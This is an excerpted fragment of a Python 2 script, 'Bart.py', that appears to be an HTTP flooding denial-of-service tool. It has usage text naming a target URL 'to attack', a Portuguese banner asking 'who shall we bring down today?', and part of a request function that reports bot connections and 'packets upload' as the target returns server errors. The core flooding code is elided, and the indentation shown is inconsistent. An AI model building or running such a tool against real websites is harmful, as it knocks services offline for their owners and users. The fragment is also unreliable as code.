...
def usage():
	print '---------------------------------------------------'
	print 'to attack:'
        print '#Windows: Bart.py http://www.exemplo.com.br/'
        print '#Linux: python Bart.py http://www.exemplo.com.br/'
	print "\Bart"
print \
"""
...
#           < Ola Hacker vamos Derrubar quem hoje? >              #
#--------             . .  ,  ,                                   #
#                              |` \/ \/ \,',                      #
#                              ;          ` \/\,.                 #
#                             :               ` \,/               #
...
def httpcall(url):
	...
	try:
			...
			#print e.code
			set_flag(1)
 			print 'Bots Is Connect..Bart..Bart..Bart..Bart..Bart..Bart..Bart.k de packets upload'
			code=500
